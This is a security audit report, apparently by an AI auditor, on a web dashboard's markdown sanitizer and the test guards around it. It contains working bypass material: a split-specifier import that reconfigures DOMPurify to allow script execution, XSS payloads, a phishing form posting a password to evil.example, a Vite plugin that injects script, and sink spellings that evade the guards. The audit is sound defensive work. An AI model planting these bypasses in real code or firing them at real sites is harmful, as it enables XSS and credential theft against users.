# Security audit — #195 round 7 (`86f30bc..7b4f6dd`)

**Auditor:** audit-195-r7 · **Tree:** `/workspace` (see "where this brief is wrong", §5.1),
detached at `7b4f6dd` · **Range verified:** `git merge-base --is-ancestor 86f30bc 7b4f6dd`
exit 0; `git merge-base 89306d0 7b4f6dd` = `86f30bc`, and `--is-ancestor 89306d0 7b4f6dd`
exit 1 — the brief's sibling warning is correct and I used `86f30bc` as the base.

**Baseline, measured, exit code read from the child process:**
`cd /workspace/web && npm ci` → 0 (105 packages, `npm audit` 0 vulnerabilities);
`npm test` → 0, `markdown sanitizer: 75 checks passed (122 assertions)`;
`npx tsc --noEmit` → 0; `npx vite build` → 0.
**No production file was modified in the audit tree** (`git status --porcelain` empty at
`7b4f6dd` on exit). Every mutation below ran in a throwaway copy at `/tmp/audit-r7/sb`.

---

## 1. VERDICT

**REQUEST CHANGES — narrowly, and nothing in the diff needs reverting.**

The round is otherwise good work: the behavioural sanitizer holds against everything I
could throw at it (§4), the two new pins (sunset clause, dependency floor) both genuinely
fire, and the two corrections r7 makes to r6's log are correct. The r7 claim that no live
vulnerability exists is one I independently confirm.

The change I am asking for is two sentences of production comment plus a severity
re-rate, because those two sentences are load-bearing:

`web/src/util/markdown.ts:99-107` states that a captured DOMPurify singleton is "a policy
bypass, not a direct script-execution bypass — the phishing form and the spoofing overlay
come back, `alert(1)` does not", and that "nothing can reach the singleton today". **Both
are false as written, and I measured both.** They are the stated justification for
deferring the fix at `markdown.ts:108-113` ("to close a finding filed as INFO with the
ownership guard already standing"). Neither half of that premise survives measurement, so
the deferral rests on nothing. See F-1 and F-2.

---

## 2. FINDINGS

Summary — Critical: 0 · High: 0 · Medium: 2 · Low: 4 · Info: 1.

No finding here is a live vulnerability. The shipped `renderMarkdown` correctly
neutralised all 40 payloads I fired at it (§4). Everything below is about whether the
*guard* can falsify what it claims.

---

### F-1 [MEDIUM] R8/R9 sanitizer ownership is defeated by a non-contiguous module specifier, and the capture yields arbitrary script execution

**Location:** `web/src/util/markdown.test.ts:2238` (the specifier pattern
``new RegExp(`['"\`]${dep}(?:/[^'"\`]*)?['"\`]`)``), `:2209`, `:2211-2250`; the claim it
supports is at `web/src/util/markdown.ts:102-107`.

**Description.** R8 owns the *name* `'dompurify'` as a contiguous quoted literal. A
specifier assembled from two adjacent literals is invisible to it, and Node, TypeScript
and Rollup all still resolve it to the identical singleton object.

**Proof of concept.** Two lines at module scope in `src/components/ft-empty-state.ts` — a
scanned, non-sink component that `src/index.ts:31` imports, so the side effect runs at
app start:

```ts
const __p = import('dompur' + 'ify');
void __p.then((m) => (m.default as { setConfig: (c: unknown) => void })
  .setConfig({ ADD_TAGS: ['script'], ADD_ATTR: ['onerror'] }));
```

Measured, all four gates:

| gate | result |
|---|---|
| `npm test` | **exit 0**, `75 checks passed (122 assertions)` — unchanged from baseline |
| `npx tsc --noEmit` | exit 0 |
| `npx vite build` | exit 0, and the capture is in the shipped bundle verbatim: `grep -oh "setConfig({[^}]*}" dist/assets/*.js` → `setConfig({ADD_TAGS:["script"],ADD_ATTR:["onerror"]}` |
| same singleton? | Rollup says so itself: *"`purify.es.mjs` is dynamically imported by `ft-empty-state.ts` but also statically imported by `src/util/markdown.ts`, dynamic import will not move module into another chunk"* — same chunk, same instance |

Independently, under Node with the real compiled `markdown.js`:
`(await import('dompur' + 'ify')).default === (await import('dompurify')).default` → `true`.

**Impact.** With that config sticky, `renderMarkdown('<img src=x onerror=alert(1)><script>alert(2)</script>')`
returns `<p><img src="x" onerror="alert(1)"><script>alert(2)</script></p>` — measured,
versus `<p><img src="x"></p>` at baseline. Arbitrary script execution on the dashboard
origin from any mirrored GitHub issue body, with the suite green.

**Positive controls (harness would have aborted without them).** `import DOMPurify from
'dompurify'` in the same file → **RED**. `document.write(x)` → **RED**. The battery
aborts on a failed prerequisite rather than continuing; the two control gates are at
`/tmp/audit-r7/mutate.sh:56-72`.

**Why this is not V25.** V25 (`Element.prototype.removeAttribute` patching) is accepted
because it *names nothing* and rules of this kind can only own names. This one names the
module. It is on the near side of the boundary the file draws for itself at
`markdown.test.ts:907-919` — and that section warns, correctly, that "we can only own
names" is "the most convenient excuse available in this file; check which one you are
using."

**Recommendation.** Do the fix the file already names and defers
(`markdown.ts:108-113`) — a private instance:

```ts
import createDOMPurify from 'dompurify';
const purify = createDOMPurify(window);          // not the process-global singleton
export function renderMarkdown(md: string): string {
  if (typeof md !== 'string') return '';
  return purify.sanitize(parser.parse(md) as string, { FORBID_TAGS, FORBID_ATTR });
}
```

This is the exact structural move `new Marked({…})` already makes for the other
dependency, and it closes the class rather than one spelling. The `window`-at-module-load
concern in the deferral is real but bounded: `markdown.test.ts:24-27` already establishes
a DOM before importing `markdown.js` for exactly this reason, so the test path is
unaffected, and the browser path always has a `window`.

*Interim only, if the private instance slips a round:* R6b — "a dynamic import specifier
must be a plain quoted literal", `markdown.test.ts:2045-2057` — already exists but is
scoped to the two `REQUIRED_SINKS` files. Promoting it to the whole scanned set would
catch this specific spelling. I flag it as interim rather than as the fix because it is
one more step on the treadmill the file is trying to get off.

---

### F-2 [MEDIUM] A production security comment states a false narrowing, and that narrowing is why the fix was deferred

**Location:** `web/src/util/markdown.ts:99-107`. Repeated in
`.design/project-log/markdown-sanitize-cleanup-r7.md:220-223`.

**Description.** The comment reads:

> NARROWER THAN IT SOUNDS, in both directions. `<script>` is still stripped in that state
> (measured: returns `''`), so this is a policy bypass, not a direct script-execution
> bypass — the phishing form and the spoofing overlay come back, `alert(1)` does not. And
> nothing can reach the singleton today: R8/R9 in markdown.test.ts deny every file but
> this one the ability to name `dompurify` at all.

I reproduced the author's own measurement first, and **it is correct for the config they
tested**: after `setConfig({ FORBID_TAGS: [], FORBID_ATTR: [] })`, `renderMarkdown` returns
`<h1>hi <form action="https://evil.example"><input name="token" type="password"></form></h1>`
where it otherwise returns `<h1>hi </h1>`, and `<img src=x onerror=…><script>…</script>`
still comes back as `<p><img src="x"></p>`. The claim is true of that call.

It is written as a property of *the state* — of singleton capture as such — and that is
false. One different config on the same captured object:

```
AFTER setConfig({ ADD_TAGS: ['script'], ADD_ATTR: ['onerror'] })
  -> "<p><img src=\"x\" onerror=\"alert(1)\"><script>alert(2)</script></p>\n"
```

`alert(1)` does come back. `addHook` (the V23 form) gives the identical result, measured.
And the second sentence is falsified by F-1.

**Impact.** This is not a comment nit. `markdown.ts:108-113` declines to fix the issue on
the grounds that it would move a `window` dependency into the security-critical path "to
close a finding filed as **INFO** with the ownership guard already standing". Both halves
of that sentence are the two claims above. The finding is not INFO-shaped when the capture
yields script execution, and the ownership guard is not standing (F-1).

**Recommendation.** Replace lines 99-107 with the measured statement — that capture of the
singleton yields *arbitrary sanitizer reconfiguration*, that `ADD_TAGS`/`ADD_ATTR` reaches
script execution, and that R8 owns the contiguous spelling of the specifier only — and
re-rate INFO-2 accordingly. Then F-1's fix follows on its own merits.

**Method note.** The brief warned that agreeing with a premise it supplied is worth
nothing. I did not take `markdown.ts`'s measurement on trust in either direction: I
re-ran their exact config (confirming them) *before* varying it (refuting the
generalisation). Script: `/tmp/audit-r7/effect.mjs`, which aborts if the baseline is not
sanitizing.

---

### F-3 [LOW] `BANNED_SINKS` misses spellings of sinks it already enumerates

**Location:** `web/src/util/markdown.test.ts:1837-1849`.

**Description.** The list is disclosed as "a tripwire, not a proof of absence… none of
these eight forms". That disclosure covers *unenumerated classes*. It does not cover
alternate spellings of a sink the list already intends to own, and a reader will
reasonably believe `document.write` covers the `document.write` family. It does not.

**Measured.** Each inserted into a scanned non-sink component; `npm test` and
`npx tsc --noEmit` exit codes read from the child.

| # | inserted | suite | tsc | in scope of the disclosure? |
|---|---|---|---|---|
| C0 | `document.write(this.subtitle)` | **RED** | clean | control — proves the harness detects |
| E1 | `document.writeln(this.subtitle)` | GREEN 75/122 | clean | **no — a spelling of a listed sink** |
| E2 | `this.ownerDocument.write(this.subtitle)` | GREEN 75/122 | clean | **no — the pattern is case-sensitive; `ownerDocument`/`contentDocument` spell `Document.write`** |
| E3 | `document.write?.(this.subtitle)` | GREEN 75/122 | clean | **no — `\s*\(` does not span `?.`** |
| E4 | `(document as …)["write"](this.subtitle)` | GREEN 75/122 | clean | **no — the indexed-access pattern covers only inner/outerHTML** |
| E5 | `new DOMParser().parseFromString(…)` + `append` | GREEN 75/122 | clean | yes — unenumerated class |
| E6 | `iframe.srcdoc = this.subtitle` | GREEN 75/122 | clean | yes — unenumerated class |
| E7 | `el.setAttribute("onmouseover", this.subtitle)` | GREEN 75/122 | clean | yes — unenumerated class |
| E8 | `Object.assign(el, { innerHTML: … })` | GREEN 75/122 | clean | yes — **explicitly** disclosed at `:1810-1812` |
| E9 | split-specifier DOMPurify capture | GREEN 75/122 | clean | see F-1 |
| E10 | `el.innerHTML\n      = this.subtitle` | **RED** | clean | correctly caught — see below |
| E11 | `Document.parseHTMLUnsafe(…)` + `append` | GREEN 75/122 | clean | yes — unenumerated class |
| E12 | `document.execCommand("insertHTML", false, …)` | GREEN 75/122 | clean | yes — unenumerated class |

E10 is worth stating as a **positive design finding**: `BANNED_SINKS` runs
`pattern.test(code)` over whole file text rather than through `matchLines`, so `\s` spans
newlines and a line-straddling assignment is still caught. I predicted this would be an
escape before measuring, and it is not. The line-scoped `matchLines` path is used only for
rules whose patterns cannot straddle.

**Recommendation.** E1-E4 are cheap and are within the list's own intent:

```ts
{ name: 'document.write/writeln', pattern: /\bdocument\s*\.\s*write(?:ln)?\s*\??\.?\s*\(/i },
{ name: 'document.write via index', pattern: /\[\s*['"]write(?:ln)?['"]\s*\]\s*\(/ },
```

(`/i` also picks up `ownerDocument`/`contentDocument`, at the cost of matching
`Document.write` in prose — which is already blanked by `stripInertText`.)

E5-E7, E11 and E12 are the treadmill the file names at `:1813-1814`, and I agree with the
file that a ninth and tenth pattern is not the route off it.

**On #204's priority — this is the answer to brief item 2.** Yes, there are concrete
escapes, and they are cheap: E1-E4 are one-token variations that anyone would write
without adversarial intent, they typecheck, they build, and they leave the suite at
exactly 75/122. Notably **none of my escapes landed on the hand-rolled balanced-delimiter
parts** of the guard (`callArguments`, `sinkArgumentIsSanitized`,
`splitTopLevelParameters`) — those held against everything. The failures are all in the
genuinely regex-shaped rules, which is precisely the subset the sunset clause at
`:842-855` schedules for deletion once #204 lands. That is evidence *for* raising #204,
and evidence *against* spending further rounds widening these patterns.

---

### F-4 [LOW] The scanned set is larger, not complete — and adding `index.html` does not generalise

**Location:** `web/src/util/markdown.test.ts:1093` (`EXTRA_SCANNED_FILES`), `:1017`
(`EXPECTED_SOURCE_FILES = 51`).

**Verified, independently of the guard's own accounting.** Mirroring
`collectSourceFiles`/`isScannableSource` with `find` gives **50** files under `src/`
(54 total, minus `theme.css`, `farmtable.json`, and the two `*.test.ts`), plus
`index.html` = **51**. The pin is accurate. Brief item 3's sub-claim is confirmed:
`index.html` is genuinely in the set, and the r7 log's self-correction about the two
halves being independent rather than conjunctive is correct.

**But the set is not complete, and the gap is demonstrable.** Files that reach the browser
or shape what does, and are scanned by nothing:
`web/vite.config.ts`, `web/public/**`, `web/package.json` (build scripts),
`web/tsconfig*.json`.

**Proof of concept, zero changes to any scanned file** — a plugin in `vite.config.ts`:

```ts
{ name: 'poc', transformIndexHtml(html: string) {
    return html.replace('</head>', '<script>window.__AUDIT_R7_POC__ = 1;</script></head>');
} },
```

`npm test` → exit 0, `75 checks passed`. `npx vite build` → exit 0.
`grep -c __AUDIT_R7_POC__ dist/index.html` → **1**. Also confirmed: `public/favicon.svg`
is copied verbatim into `dist/`, so anything added to `public/` ships unscanned.

**This is disclosed** — `markdown-sanitize-cleanup-r7.md:275-277` and the docblock at
`:1086-1091` both say the scanned set is "`src/` plus a hand-maintained list" and name
`public/` and "a Vite plugin" specifically. The disclosure is accurate and I am confirming
rather than contradicting it. What I am adding is that **the obvious remedy does not
work**: putting `vite.config.ts` into `EXTRA_SCANNED_FILES` would *not* have caught my PoC,
because no rule in `BANNED_SINKS` or `directiveIndirectionOffenders` matches a
`transformIndexHtml` hook returning a string. Do not close this by adding the path and
calling it covered — that would be fake coverage of exactly the kind
`markdown.test.ts:946-950` warns against for `.prototype`.

**Recommendation.** Treat build configuration as security-relevant in review, and close
the class with CSP + Subresource Integrity rather than with the scanner (see F-6). A CSP
would have neutered this PoC and F-1 both.

---

### F-5 [LOW] Nothing in CI runs the guard — it executes only when a human types `npm test`

**Location:** `/workspace/Makefile:9-10` (`test: go test ./...`), `:16-17`
(`web: cd web && npm ci && npm run build`); no `.github/workflows` directory exists.

`npm run build` is `tsc --noEmit && vite build` — it does not run the suite. So `make test`
and `make web` between them never execute a single one of the 75 checks. Every mitigation
in F-1 through F-4, and the whole 3372-line guard, is advisory.

**This is disclosed** at `markdown-sanitize-cleanup-r7.md:285-287` ("CI was not touched —
the audit is right that `npm test` in CI is worth more than further hardening"). I confirm
it and rate it Low only because the codebase has no CI *at all*, so this is not a
markdown-specific regression. I raise it here because it is the multiplier on everything
above: a guard that no gate runs cannot fail closed.

**Recommendation.** One workflow, and it is worth more than another hardening round:

```yaml
- run: cd web && npm ci && npm test    # exit code from the child, not through a pipe
- run: cd web && npx tsc --noEmit
- run: go test ./... && go vet ./...
```

---

### F-6 [LOW] No CSP, no Trusted Types; attacker markdown loads remote subresources with no interaction

**Location:** `web/index.html` (no `<meta http-equiv="Content-Security-Policy">`) and
`internal/serverapp/unified.go:101`, which serves the dashboard as
`mux.Handle("/", http.FileServer(assets))` — a bare `FileServer` that sets no security
headers at all. `grep -rn "Content-Security-Policy" --include='*.go' --include='*.html'
--include='*.ts'` over the repo returns **nothing**. *Positive control for that grep:* the
same invocation with `Content-Type` returns hits in three Go files
(`internal/serverapp/session.go:286`, `unified.go`, `llm_anthropic.go`), so the grep can
find a header when one is set.

By design, `![p](https://evil.example/pixel.png)` renders as
`<img src="https://evil.example/pixel.png" alt="p">` and `<img srcset="…">` survives intact
(measured). Viewing a mirrored GitHub issue therefore discloses the viewer's IP, User-Agent
and referrer to an attacker-chosen origin with no interaction, and gives a read receipt on
internal task viewing. That is a normal trade for a markdown renderer, so I rate it Low and
not a defect — but with no CSP there is no second layer under any of F-1 through F-4.

**Recommendation.** A CSP served with the dashboard would independently neuter F-1's
`<script>` injection and F-4's build-time injection:
`default-src 'self'; script-src 'self'; object-src 'none'; base-uri 'none';
frame-ancestors 'none'; img-src 'self' https:` (or `img-src 'self' data:` if remote images
are not wanted). Noted as already routed out of scope at `r7.md:283-284`.

---

### F-7 [INFO] Dependency floors: stronger than documented in one direction, absent for `marked`

**Location:** `web/src/util/markdown.test.ts:3276-3289`.

The floor check's docblock says "a lockfile or a patched `node_modules` below the floor
passes here". I tried to make the lockfile half true and **could not**:

| route | measured |
|---|---|
| loosen declared range to `^3.0.0` (control) | **RED**, exit 1 — the pin fires |
| `"overrides": { "dompurify": "3.1.0" }` | **blocked by npm**: `EOVERRIDE — Override for dompurify@^3.4.12 conflicts with direct dependency` |
| lockfile edited to `3.1.0`, range left at `^3.4.12` | **blocked by npm**: `npm ci` exit 1, `EUSAGE — Invalid: lock file's dompurify@3.1.0 does not satisfy dompurify@3.4.12` |
| `npm:` alias in the range | would change the declared string → RED by inspection |

So the realistic silent-downgrade routes are closed by `npm ci` itself, and the residue is
narrower than the docblock claims: a **patched `node_modules`** in a build image, which no
`package.json` rule can reach. That is an SRI/provenance problem, not a floor problem.

Two remaining gaps, both Info:
- **`marked` has no floor.** `^15.0.0` accepts any 15.x. `marked`'s historical advisories
  are ReDoS, and its input here is attacker-controlled markdown, so the exposure is a
  hung render thread rather than XSS — DOMPurify runs downstream of it either way (§3).
  Consider `^15.0.12` with the same docblock treatment.
- `npm audit`: **0 vulnerabilities**, 106 packages, at `dompurify@3.4.12`,
  `marked@15.0.12`, `lit@3.3.2`. Lockfile is committed.

**Brief items 3 and 5, answered.** Both new pins genuinely fire, verified by mutation with
false-positive controls: declaring `typescript-eslint` → **RED** with the full sunset
message; adding an unrelated devDependency (`prettier`) → **GREEN**; loosening the floor →
**RED**. The r7 claim is accurate.

---

## 3. The DOMPurify/marked ownership asymmetry — brief item 4

The brief asked what the asymmetry *permits*. I measured both halves rather than reasoning
from the file's account of them, and the answer inverts the framing:

| | made **private** (`new Marked({…})`) | left **shared** (`DOMPurify` default export) |
|---|---|---|
| what capture yields, raw | `<script>alert(1)</script><img src=x onerror=alert(2)>` | — |
| …after the *other* dependency runs | **`<img src="x">`** — DOMPurify filters it anyway | **`<p><img src="x" onerror="alert(1)"><script>alert(2)</script></p>`** |
| reachable today? | no (private instance; pinned by effect at `taskLists()`) | **yes** (F-1) |

`marked` runs **upstream** of `DOMPurify`, so poisoning it is filtered by the sanitizer
regardless — capturing the private half buys an attacker nothing even on success.
`DOMPurify` is the terminal filter, so capturing the shared half buys everything.

**The asymmetry is backwards relative to risk.** The dependency that was hardened is the
one the other would have covered; the dependency left as a process-global is the last line
of defence. `markdown.ts:76-81` argues for the private `Marked` on the grounds that "a
renderer runs BEFORE DOMPurify sees the string" — which is exactly the reason it is the
*less* urgent of the two. The private `Marked` is still worth keeping (defence in depth,
and it has a real effect-based pin), but it should not be read as evidence that this
pipeline's ownership story is in good shape. Confirms the brief's framing that "a
correctly-called DOMPurify with permissive options is not a control" — and makes it
concrete.

Measurement: `/tmp/audit-r7/asym.mjs`.

---

## 4. Positive observations

- **The behavioural boundary holds.** I fired an independent 40-payload corpus at the
  shipped `renderMarkdown` — entity- tab- and newline-split `javascript:` schemes, SVG
  `xlink:href` / `animate` / `set` retargeting, `<svg><style>@import>`, MathML
  `annotation-xml` and `maction statusline#`, `noscript`/`template`/`xmp`/`plaintext`/
  `listing` re-parse tricks, table-context mXSS, `<video><source onerror>`, entity-encoded
  `srcdoc`, `is=`, `<![CDATA[`, conditional comments — re-parsed each output through
  `innerHTML` exactly as `unsafeHTML` will, and flagged any `on*` attribute, dangerous tag,
  forbidden attribute or dangerous URI. **0 of 40 flagged.** Detector proven first: it fires
  on raw `<img src=x onerror=alert(1)>`, and aborts if it does not. (`/tmp/audit-r7/sb/fuzz.mjs`.)
- **Both enumerated sinks are correctly wrapped**, read by hand:
  `ft-inspector-comments.ts:221` and `ft-inspector-desc.ts:233`, both
  `${unsafeHTML(renderMarkdown(…))}`. Independent grep across the whole web tree finds
  exactly two `unsafeHTML(` call sites in non-test source and **zero** `innerHTML` /
  `document.write` / `insertAdjacentHTML` / `srcdoc` / `eval` occurrences. Positive control
  for that grep: it finds `host.innerHTML = html` at `markdown.test.ts:61`.
- **No Go-side HTML rendering exists.** `assets.go` embeds `web/dist` and serves it; no
  `html/template` or `text/template` import anywhere in the repo. The sink surface really is
  confined to the web bundle.
- **The count pins are honest.** `EXPECTED_SOURCE_FILES = 51` reproduces exactly under an
  independent `find`. `EXPECTED_CHECKS = 75` and `EXPECTED_ASSERTIONS = 122` match the
  runtime output.
- **`BANNED_SINKS` is not line-scoped**, so line-straddling assignments are caught (E10).
  I predicted an escape there and was wrong; that is a deliberate correct design choice.
- **The r7 log's costly-disclosure section is exemplary** and I found no inaccuracy in it.
  In particular the self-refutation about `index.html` being invisible "twice over" is
  correct — I re-derived that `EXTRA_SCANNED_FILES` reads by explicit path and bypasses
  `isScannableSource` entirely.

---

## 5. C-A — what I could not verify

1. **Browser-parser behaviour.** Every behavioural result in §4 is jsdom 26.1.0. mXSS is a
   parser-differential class and jsdom is not Blink or WebKit. *Falsified by:* running the
   same corpus in headless Chrome and Firefox. I did not, and I am not extrapolating from
   40 jsdom passes to "no mXSS exists".
2. **The components as rendered.** I read `ft-inspector-comments.ts:221` and
   `ft-inspector-desc.ts:233` but never instantiated either — no component harness exists,
   which the file itself explains at `markdown.test.ts:789-798`. So "the sanitized string is
   what reaches the shadow root" is a source reading, not a measurement. *Falsified by:* the
   Phase 2 component harness.
3. **Whether `3.4.12` is the correct advisory line.** I took the floor's rationale on trust
   and confirmed only that `npm audit` is clean at that version. I did not enumerate
   DOMPurify's advisories through 3.2.x. *Falsified by:* a GHSA review.
4. **The V25 prototype-patch survivor.** Documented as runtime-verified in
   `reports/dev-195-vectors.json`; that file is not in this tree
   (`ls reports/` — no such path under `/workspace`), so I could not read the evidence. I
   neither confirm nor dispute it, and F-1 does not depend on it.
5. **Whether any *other* npm package in the tree re-exports DOMPurify** and could serve as
   an F-1-style laundering point without the split-specifier trick. I scanned first-party
   source only, not the 105 installed packages.

---

## 6. C-B — the finding I am least sure about

**F-3's severity.** `BANNED_SINKS` is explicitly disclosed as "an enumeration of KNOWN
SINKS… not a proof of absence", and a strict reading makes every one of my twelve escapes
pre-disclosed at class level and therefore Info, not Low. I argue Low for E1-E4 specifically
because a reasonable reader takes an entry named `document.write` to cover
`document.writeln` and `ownerDocument.write`, so those four are misses *inside the rule's
own intent* rather than outside its stated scope — and the disclosure was written to cover
the latter. But that turns on how the disclosure is read, and a reviewer who rates all
twelve Info is applying the file's own words correctly. E5-E8 and E11-E12 I would not argue
above Info.

Second-least sure: whether **F-1 should be Medium or High**. It needs commit access, which
under the standing severity table caps it at Medium. Against that: it is the same threat
model the team judged worth building R8 and R9 for (V23, V24b), the guard's own text asserts
this axis is closed, and the outcome is arbitrary script execution rather than the policy
bypass the code claims. I settled on Medium because "requires local access / commit access"
is the table's own Medium criterion and I would rather be consistent with the table than
argue the rating upward.

---

## 7. Where this brief is wrong

1. **The tree path.** The brief gives `/workspace/farmtable-195-r7-audit`; no such directory
   exists in this container. The checkout is `/workspace` itself, at `7b4f6dd`
   (`git rev-parse --show-toplevel`). I located it before starting and did not create the
   missing path. *(The EM sent a correction mid-audit confirming this — I had already found
   and worked around it, so it cost nothing.)*

2. **"The sink guard is REGEX-based" is tagged [MEASURED] and is only two-thirds true —
   and the third that is untrue is the third that held.** The guard has three layers, and
   only one is regex:
   - genuinely regex: `BANNED_SINKS`, `directiveIndirectionOffenders`, the R8 specifier
     pattern, R2/R3/R4/R7;
   - a **hand-rolled tokenizer**: `stripInertText` (~220 lines, with a mode stack, template
     interpolation tracking, and regex-literal-vs-division disambiguation);
   - **hand-rolled balanced-delimiter parsers**: `callArguments`,
     `sinkArgumentIsSanitized`, `splitTopLevelParameters`.

   This matters because it changes what the finding means. **Every escape I found landed on
   the regex layer. Nothing I tried defeated the paren-counting layer.** So the brief's
   instruction pointed me at the right target, but the reason it gave undersells the guard
   and would have mis-scoped the conclusion: the recommendation is not "replace the guard,
   it is regexes", it is "replace the regex-shaped *subset*" — which is exactly what the
   sunset clause at `markdown.test.ts:842-855` already enumerates
   (`stripInertText`, `stripImportStatements`, R3, R4, R7,
   `directiveIndirectionOffenders`, `BANNED_SINKS`). #204 should be scoped to that list and
   should *not* absorb `sinkArgumentIsSanitized` or the arity parser, which are doing work
   an AST rule would have to reimplement anyway.

3. **Brief item 1 asks "can anything reach the DOM unsanitized?" — as posed, the answer is
   no**, and the interesting question is a different one. Measured 40 payloads through the
   real function plus an independent enumeration of every sink form I know: nothing reaches
   the DOM unsanitized in the tree as it stands. The exposure is entirely in what a *future*
   commit can do while the suite stays green, which is what F-1 through F-4 are about. The
   brief's framing risks a leg reporting "no" and stopping.

4. **Brief item 3's phrasing ("whether the scanned set is now actually complete") implies
   the round may have claimed completeness. It did not.** `markdown-sanitize-cleanup-r7.md:275-277`
   and the docblock at `markdown.test.ts:1086-1091` both state the residue explicitly and
   name `public/` and "a Vite plugin" as the gaps — the exact two I then demonstrated. The
   "added one more file reported as we cover everything" failure mode the brief warned about
   did not occur here. Worth recording, because the warning was well-founded generally and
   this round is the counterexample.

5. Everything else I relied on checked out: the ancestry warning about `89306d0`
   (verified both directions), that r7 is the XSS boundary, that DOMPurify configuration is
   part of its attack surface, and that a check deriving from the thing it checks is the
   recurring defect class — F-1 and F-2 are two more instances of it.

---

## 8. Reproduction

All artefacts under `/tmp/audit-r7/` (out of repo). Every harness aborts on a failed
prerequisite with a distinct exit code and reads child exit codes directly, never through a
pipe.

| script | what it establishes | prerequisite gates |
|---|---|---|
| `mutate.sh` | the 12-mutation escape battery (F-1, F-3) | baseline green at 75/122 (exit 92/93); `document.write` control RED (exit 94); `dompurify` import control RED (exit 95) |
| `effect.mjs` | singleton capture → script execution (F-1, F-2) | baseline must sanitize both payloads (exits 90/91); split specifier must be the same object (exit 92) |
| `chain.sh` | end-to-end chains A and B (F-1, F-4) | baseline 75/122 (exits 90/91); anchors present (exits 92/93) |
| `supply.sh` / `supply2.sh` | floor, sunset, overrides, lockfile, audit (F-7) | floor is `^3.4.12` (90); `npm ci` 0 (91); baseline green (92); loosening control RED (93) |
| `sb/fuzz.mjs` | the 40-payload behavioural corpus (§4) | detector must see `onerror` on raw markup (exit 90) |
| `sb/asym.mjs` | the ownership asymmetry (§3) | — |
| `predictions.md` | P1-P9, written before measuring | P3/P4 (writeln, `ownerDocument.write` escape) predicted then confirmed; P2 (51 files) predicted then confirmed; **the E10 prediction was wrong and is reported as wrong** |
